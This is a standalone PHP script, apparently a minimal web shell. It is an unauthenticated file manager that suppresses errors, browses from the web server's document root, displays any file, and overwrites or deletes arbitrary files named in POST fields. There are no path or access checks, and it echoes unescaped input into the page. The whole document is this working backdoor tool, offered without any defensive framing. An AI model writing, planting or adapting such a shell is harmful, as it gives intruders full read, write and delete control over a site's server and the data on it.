<?php
error_reporting(0);
?>
<form action="" method="post" id="fm">
	<?php
	function getFile($path,$charset) {
		header("Content-Type:text/html;charset=".$charset);
		if (is_dir($path)) {
			$dir = opendir($path);
			while ($file = readdir($dir)) {
          		?>
          		<a href="javascript:get('<?= str_replace('\\', '/', $path).'/'.$file ?>');"><?= $file ?></a><br>
          		<?php
          	}
          	closedir($dir);
     	} else {
     		?>
     		File : <input type="text" name="file" value="<?= $path ?>">
     		<input type="button" value="update" onclick="update('update')">
     		<input type="button" value="delete" onclick="update('delete')"><br>
     		<textarea name="data"><?= htmlspecialchars(file_get_contents($path)) ?></textarea>
     		<?php
     	}
     ?>
     <input type="hidden" name="p" id="p" value="<?= $path ?>">
     <input type="hidden" name="action" id="action" value="get">
</form>
<?php     
}

function update($filename,$data)
{
	file_put_contents($filename, $data);
    ?><script>history.back(-1);alert('ok');</script> <?php
}

if('update' == $_POST['action']) 
{
	update($_POST['file'], $_POST['data']);
} 
else if('delete' == $_POST['action']) 
{
    if(file_exists($_POST['file'])) 
    {
     	unlink($_POST['file']);
     	?><script>history.back(-1);alert('delete ok');</script><?php
    }
} 
else 
{
     getFile($_POST['p'] !='' ? $_POST['p'] : $_SERVER['DOCUMENT_ROOT'], $_POST['charset'] != '' ? $_POST['charset'] : "UTF-8");
}
?>
<script>
function get(p)
{
    document.getElementById('p').value = p;
    document.getElementById('action').value = "get";
    document.getElementById('fm').submit();
}
function update(act)
{
    document.getElementById('action').value = act;
    document.getElementById('fm').submit();
}
</script>
